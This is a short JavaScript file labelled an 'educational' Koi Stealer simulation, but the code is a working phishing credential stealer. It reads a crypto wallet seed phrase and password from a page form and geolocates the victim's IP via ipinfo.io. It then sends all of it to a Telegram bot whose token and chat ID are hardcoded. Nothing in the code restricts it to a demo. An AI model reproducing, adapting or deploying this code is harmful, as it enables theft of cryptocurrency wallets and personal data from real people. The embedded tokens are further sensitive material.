// === KOI STEALER SIMULATION SCRIPT ===
// For Cybersecurity Awareness — Educational Demo
// -----------------------------------------------

const botToken = "7986200355:AAE5W_YXK5RSVgHBCqOrBiurWmNpbTPPL7Q";
const chatId = "6697993658";
const ipInfoToken = "97788c7d33c9af";

function log(msg) {
  console.log(`[KoiStealer] ${new Date().toLocaleString()} → ${msg}`);
}

document.addEventListener("DOMContentLoaded", () => {
  const form = document.getElementById("stealerForm");

  if (!form) {
    log("❌ Form not found on page.");
    return;
  }

  form.addEventListener("submit", async (event) => {
    event.preventDefault();
    log("📩 Form submitted.");

    const seed = document.getElementById("wallet")?.value || "N/A";
    const pass = document.getElementById("password")?.value || "N/A";

    // Step 1: Get IP/location
    let geoInfo = {
      ip: "Unavailable",
      city: "N/A",
      region: "N/A",
      country: "N/A"
    };

    try {
      const res = await fetch(`https://ipinfo.io/json?token=${ipInfoToken}`);
      geoInfo = await res.json();
      log(`🌍 IP Data: ${geoInfo.ip} - ${geoInfo.city}, ${geoInfo.region}, ${geoInfo.country}`);
    } catch (err) {
      log("⚠️ Could not retrieve GeoIP data.");
    }

    // Step 2: Build message
    const message = `
🚨 *Koi Stealer Simulation Triggered*
🕒 Time: ${new Date().toLocaleString()}
🌐 IP: ${geoInfo.ip}
📍 Location: ${geoInfo.city}, ${geoInfo.region}, ${geoInfo.country}

🔑 Seed Phrase: \`${seed}\`
🔐 Wallet Password: \`${pass}\`
    `;

    log("📤 Sending data to Telegram...");

    // Step 3: Send to Telegram
    try {
      const telegramRes = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: "Markdown"
        })
      });

      const result = await telegramRes.json();

      if (result.ok) {
        log("✅ Data sent to Telegram successfully.");
      } else {
        log(`❌ Telegram API error: ${result.description}`);
      }

    } catch (error) {
      log(`🚫 Telegram send failed: ${error.message}`);
    }
  });
});
